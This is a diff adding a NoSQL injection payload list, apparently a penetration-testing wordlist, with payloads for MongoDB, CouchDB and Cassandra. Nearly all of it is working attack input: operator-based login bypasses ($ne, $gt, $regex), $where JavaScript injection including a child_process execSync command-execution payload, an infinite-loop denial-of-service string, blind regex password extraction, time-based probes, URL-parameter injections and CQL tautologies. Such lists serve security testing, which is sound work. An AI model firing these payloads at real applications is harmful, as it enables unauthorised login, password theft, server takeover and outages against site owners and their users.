@@ -1,0 +1,108 @@
+# NoSQL Injection Payloads
+# Target: MongoDB, CouchDB, Cassandra, etc.
+
+# === MONGODB OPERATOR INJECTION ===
+# Authentication Bypass
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$gte": ""}, "password": {"$gte": ""}}
+{"username": {"$lt": "~"}, "password": {"$lt": "~"}}
+{"username": {"$nin": [""]}, "password": {"$nin": [""]}}
+{"username": {"$not": {"$eq": ""}}, "password": {"$not": {"$eq": ""}}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+
+# Regex-based
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+{"username": {"$regex": "^a.*"}, "password": {"$ne": ""}}
+{"username": {"$regex": "admin", "$options": "i"}, "password": {"$ne": ""}}
+
+# In operator
+{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}
+{"username": {"$in": ["admin"]}, "password": {"$in": ["password", "admin", "123456"]}}
+
+# === MONGODB $WHERE INJECTION ===
+{"$where": "1==1"}
+{"$where": "this.username == 'admin'"}
+{"$where": "this.password.length > 0"}
+{"$where": "sleep(5000)"}
+{"$where": "function() { return true; }"}
+{"username": {"$where": "this == 'admin'"}}
+
+# JavaScript Injection
+{"$where": "this.constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"whoami\")')()"}
+{"$where": "while(1){}"}
+
+# === TYPE JUGGLING ===
+{"username": "admin", "password": true}
+{"username": "admin", "password": false}
+{"username": "admin", "password": null}
+{"username": "admin", "password": []}
+{"username": "admin", "password": {}}
+{"username": "admin", "password": 1}
+{"username": "admin", "password": 0}
+
+# Array injection
+{"username": ["admin"], "password": {"$ne": ""}}
+{"username": {"$type": 2}, "password": {"$ne": ""}}
+
+# === URL PARAMETER INJECTION ===
+# Converts to MongoDB query
+username[$ne]=admin&password[$ne]=admin
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$gt]=
+username[$in][0]=admin&password[$ne]=
+
+# === OPERATOR EXTRACTION ===
+{"username": "admin", "password[$ne]": "wrong"}
+{"username": "admin", "password[$gt]": ""}
+{"username": "admin", "password[$regex]": ".*"}
+
+# === DATA EXTRACTION (Blind) ===
+# Length detection
+{"username": "admin", "password": {"$regex": "^.{1}$"}}
+{"username": "admin", "password": {"$regex": "^.{8}$"}}
+
+# Character extraction
+{"username": "admin", "password": {"$regex": "^a.*"}}
+{"username": "admin", "password": {"$regex": "^ab.*"}}
+{"username": "admin", "password": {"$regex": "^[a-z].*"}}
+
+# === COUCHDB INJECTION ===
+{"selector": {"_id": {"$gt": null}}}
+{"selector": {"username": {"$regex": ".*"}}}
+
+# === CASSANDRA CQL INJECTION ===
+' OR 1=1--
+' OR ''='
+admin'--
+
+# === TIME-BASED BLIND ===
+{"$where": "sleep(5000) || true"}
+{"$where": "new Date().getTime() + 5000 < new Date().getTime()"}
+{"username": {"$where": "sleep(5000)"}}
+
+# === UNION-LIKE EXTRACTION ===
+# Extract all documents
+{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}
+
+# === SPECIAL PAYLOADS ===
+# Null byte
+{"username": "admin\x00", "password": {"$ne": ""}}
+
+# Unicode
+{"username": {"$regex": "admin\u0000"}, "password": {"$ne": ""}}
+
+# === EXPRESS.JS SPECIFIC ===
+# Query string to object
+?username[$ne]=&password[$ne]=
+?username=admin&password[$regex]=.*
+?user[username]=admin&user[password][$ne]=
+
+# === GRAPHQL + NOSQL ===
+{"query": "{ users(filter: {username: {$ne: \"\"}}) { id username } }"}
+
+# === AGGREGATION PIPELINE ===
+[{"$match": {"username": {"$ne": ""}}}]
+[{"$project": {"password": 1}}]
